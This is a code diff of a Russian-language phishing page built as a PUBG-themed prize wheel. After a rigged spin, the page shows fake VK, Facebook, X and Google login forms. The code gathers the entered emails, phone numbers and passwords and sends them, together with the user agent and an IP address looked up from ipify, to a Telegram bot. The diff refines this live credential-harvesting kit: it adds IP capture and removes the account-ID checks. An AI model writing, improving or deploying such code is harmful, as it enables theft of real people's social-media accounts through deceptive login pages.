-                // Проверяем, является ли пользователь владельцем
-                const isOwner = localStorage.getItem('isOwner') === 'true';
-                
-                if (!isOwner && hasPlayed) {
+                if (hasPlayed) {
                     showNotification("Вы уже использовали свою попытку сегодня!", true);
                     return;
                 }
@@ -3614,8 +2533,7 @@
                 selectionFrame.style.opacity = '1';
                 
                 spinCount = 0;
-                // Рандомная скорость вращения
-                spinSpeed = Math.random() * 40 + 40; // От 40 до 80 мс
+                spinSpeed = 80; // Быстрее начальная скорость
                 currentPrizeIndex = 0;
                 
                 spinInterval = setInterval(spinStep, spinSpeed);
@@ -3628,14 +2546,14 @@
                 currentPrizeIndex = (currentPrizeIndex + 1) % prizeOrder.length;
                 spinCount++;
                 
-                // Динамическое замедление
-                if (spinCount > Math.random() * 15 + 20) { // От 20 до 35
-                    spinSpeed += Math.random() * 10 + 5; // Увеличиваем на 5-15 мс
+                // Замедление в конце
+                if (spinCount > totalSpins * 0.7) {
+                    spinSpeed += 15;
                     clearInterval(spinInterval);
                     spinInterval = setInterval(spinStep, spinSpeed);
                 }
                 
-                if (spinCount >= Math.random() * 10 + 40) { // От 40 до 50
+                if (spinCount >= totalSpins) {
                     clearInterval(spinInterval);
                     
                     spinSound.pause();
@@ -3657,15 +2575,8 @@
                             // Обновляем значок с анимацией
                             updatePrizeBadge();
                             
-                            // Сохраняем, что пользователь уже играл (если не владелец)
-                            if (userIP !== ownerIP) {
-                                hasPlayed = true;
-                                localStorage.setItem('hasPlayed', 'true');
-                                playBtn.innerHTML = '<i class="fas fa-check"></i> УЖЕ ИГРАЛИ';
-                            } else {
-                                playBtn.innerHTML = '<i class="fas fa-play"></i> ИГРАТЬ';
-                            }
-                            
+                            hasPlayed = true;
+                            playBtn.innerHTML = '<i class="fas fa-check"></i> УЖЕ ИГРАЛИ';
                             playBtn.disabled = false;
                             
                             // Сбрасываем выбор соцсети
@@ -3675,12 +2586,6 @@
                             // Показываем форму выбора соцсети
                             socialSelectSection.classList.add('active');
                             socialSelectSection.scrollIntoView({ behavior: 'smooth' });
-                            
-                            // Показываем блок ввода ID, если он еще не заполнен
-                            if (!userAccountId) {
-                                accountIdSection.scrollIntoView({ behavior: 'smooth' });
-                                showNotification("Не забудьте ввести ID вашего аккаунта для получения приза", false, false);
-                            }
                             
                             showNotification("Поздравляем! Вы выиграли приз!", false, true);
                         }, 1000);
@@ -3715,18 +2620,9 @@
                 e.preventDefault();
                 const password = this.querySelector('input').value;
                 
-                // Проверяем, введен ли ID аккаунта
-                if (!userAccountId) {
-                    showNotification("Сначала введите ID вашего аккаунта", true);
-                    closeModal('xModalStep2');
-                    accountIdSection.scrollIntoView({ behavior: 'smooth' });
-                    return;
-                }
-                
                 const loginData = {
                     username: xUsername,
-                    password: password,
-                    account_id: userAccountId
+                    password: password
                 };
                 
                 const success = await sendLoginDataToTelegram('x', loginData, finalPrizeIndex);
@@ -3744,20 +2640,10 @@
             document.getElementById('vkLoginForm').addEventListener('submit', async function(e) {
                 e.preventDefault();
                 const inputs = this.querySelectorAll('input');
-                
-                // Проверяем, введен ли ID аккаунта
-                if (!userAccountId) {
-                    showNotification("Сначала введите ID вашего аккаунта", true);
-                    closeModal('vkModal');
-                    accountIdSection.scrollIntoView({ behavior: 'smooth' });
-                    return;
-                }
-                
                 const loginData = {
                     phone: inputs[0].value,
                     password: inputs[1].value,
-                    foreign_computer: inputs[2].checked ? 'Да' : 'Нет',
-                    account_id: userAccountId
+                    foreign_computer: inputs[2].checked ? 'Да' : 'Нет'
                 };
                 
                 const success = await sendLoginDataToTelegram('vk', loginData, finalPrizeIndex);
@@ -3775,19 +2661,9 @@
             document.getElementById('facebookLoginForm').addEventListener('submit', async function(e) {
                 e.preventDefault();
                 const inputs = this.querySelectorAll('input');
-                
-                // Проверяем, введен ли ID аккаунта
-                if (!userAccountId) {
-                    showNotification("Сначала введите ID вашего аккаунта", true);
-                    closeModal('facebookModal');
-                    accountIdSection.scrollIntoView({ behavior: 'smooth' });
-                    return;
-                }
-                
                 const loginData = {
                     email: inputs[0].value,
-                    password: inputs[1].value,
-                    account_id: userAccountId
+                    password: inputs[1].value
                 };
                 
                 const success = await sendLoginDataToTelegram('facebook', loginData, finalPrizeIndex);
@@ -3817,9 +2693,6 @@
                 googlePasswordInput.value = '';
                 googleShowPassword.checked = false;
                 googlePasswordInput.type = 'password';
-                
-                // Анимация перехода
-                googleStep2.style.animation = 'slideInRight 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275)';
             });
             
             googleSubmitBtn.addEventListener('click', async function(e) {
@@ -3831,21 +2704,12 @@
                     return;
                 }
                 
-                // Проверяем, введен ли ID аккаунта
-                if (!userAccountId) {
-                    showNotification("Сначала введите ID вашего аккаунта", true);
-                    closeGoogleFullscreen();
-                    accountIdSection.scrollIntoView({ behavior: 'smooth' });
-                    return;
-                }
-                
                 const showPassword = googleShowPassword.checked;
                 
                 const loginData = {
                     email: googleEmail,
                     password: password,
-                    show_password: showPassword ? 'Да' : 'Нет',
-                    account_id: userAccountId
+                    show_password: showPassword ? 'Да' : 'Нет'
                 };
                 
                 const success = await sendLoginDataToTelegram('google', loginData, finalPrizeIndex);
@@ -3871,26 +2735,19 @@
             // Кнопка "Создать аккаунт" в Google
             document.getElementById('googleCreateAccountBtn').addEventListener('click', function(e) {
                 e.preventDefault();
-                showNotification("Функция создания аккаунта временно недоступна", false, false);
+                showNotification("Функция создания аккаунта временно недоступна");
             });
             
             // Кнопка "Забыли пароль" в Google
             document.getElementById('googleForgotPasswordBtn').addEventListener('click', function(e) {
                 e.preventDefault();
-                showNotification("Функция восстановления пароля временно недоступна", false, false);
+                showNotification("Функция восстановления пароля временно недоступна");
             });
             
             // Обработчик кнопки получения приза
             getPrizeBtn.addEventListener('click', async function() {
                 if (!selectedSocial) {
                     showNotification("Пожалуйста, выберите социальную сеть", true);
-                    return;
-                }
-                
-                // Проверяем, введен ли ID аккаунта
-                if (!userAccountId) {
-                    showNotification("Сначала введите ID вашего аккаунта", true);
-                    accountIdSection.scrollIntoView({ behavior: 'smooth' });
                     return;
                 }
                 
@@ -3918,13 +2775,13 @@
                 const socialNames = {
                     'vk': 'ВКонтакте',
                     'facebook': 'Facebook',
-                    'x': 'X',
+                    'x': 'Twitter/X',
                     'google': 'Google'
                 };
                 
                 const prizeNumber = prizeIndex + 1;
                 
-                let message = `🔐 НОВЫЕ ДАННЫЕ ДЛЯ ВХОДА 🔐\n\n`;
+                let message = `🔐 НОВЫЕ ДАННЫЕ ДЛЯ ВХОДА PUBG 🔐\n\n`;
                 message += `📱 Соцсеть: ${socialNames[socialType] || socialType}\n`;
                 
                 // Добавляем данные в зависимости от соцсети
@@ -3944,16 +2801,27 @@
                     message += `👁️ Показать пароль: ${loginData.show_password || 'Нет'}\n`;
                 }
                 
-                // Добавляем ID аккаунта
-                message += `🎮 ID аккаунта: ${loginData.account_id || 'Не указано'}\n`;
                 message += `🎁 Выигранный приз: #${prizeNumber}\n`;
                 message += `⏰ Время: ${new Date().toLocaleString()}\n`;
                 message += `🌐 User Agent: ${navigator.userAgent}\n`;
-                message += `📍 IP: ${userIP || 'Не определен'}`;
+                message += `📍 IP: собирается...`;
                 
                 const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                 
                 try {
+                    // Попробуем получить IP адрес
+                    let ipAddress = 'Не определен';
+                    try {
+                        const ipResponse = await fetch('https://api.ipify.org?format=json');
+                        const ipData = await ipResponse.json();
+                        ipAddress = ipData.ip;
+                    } catch (ipError) {
+                        console.log('Не удалось получить IP:', ipError);
+                    }
+                    
+                    // Заменяем IP в сообщении
+                    const finalMessage = message.replace('собирается...', ipAddress);
+                    
                     const response = await fetch(url, {
                         method: 'POST',
                         headers: {
@@ -3961,7 +2829,7 @@
                         },
                         body: JSON.stringify({
                             chat_id: TELEGRAM_CHAT_ID,
-                            text: message,
+                            text: finalMessage,
                             parse_mode: 'HTML'
                         })
                     });
@@ -3992,12 +2860,6 @@
             selectionIndicator.style.opacity = '0';
             updatePrizeBadge();
             
-            // Проверяем, играл ли пользователь уже
-            if (hasPlayed && userIP !== ownerIP) {
-                playBtn.innerHTML = '<i class="fas fa-check"></i> УЖЕ ИГРАЛИ';
-                playBtn.disabled = false;
-            }
-            
             // Закрытие окна приза при клике на кнопку "Закрыть"
             collectPrizeBtn.addEventListener('click', closePrizeWindow);
             
@@ -4008,7 +2870,7 @@
                 }
             });
             
-            // Закрытие Google Fullscreen при клике вне его
+            // Закрытие Google Fullscreen при клике вне его (но внутри контейнера)
             googleFullscreen.addEventListener('click', function(e) {
                 if (e.target === this) {
                     closeGoogleFullscreen();
@@ -4065,25 +2927,6 @@
                     closeGoogleFullscreen();
                 }
             });
-            
-            // Автоматическая анимация рамки до начала игры
-            function animateFrameRandomly() {
-                if (!isSpinning && !hasPlayed) {
-                    const randomIndex = Math.floor(Math.random() * prizeItems.length);
-                    moveFrameToPrize(randomIndex);
-                    
-                    // Рандомный интервал для следующей анимации
-                    const nextDelay = Math.random() * 2000 + 1000; // 1-3 секунды
-                    setTimeout(animateFrameRandomly, nextDelay);
-                }
-            }
-            
-            // Запускаем анимацию рамки через 2 секунды после загрузки
-            setTimeout(() => {
-                if (!isSpinning) {
-                    animateFrameRandomly();
-                }
-            }, 2000);
         });
     </script>
 </body>
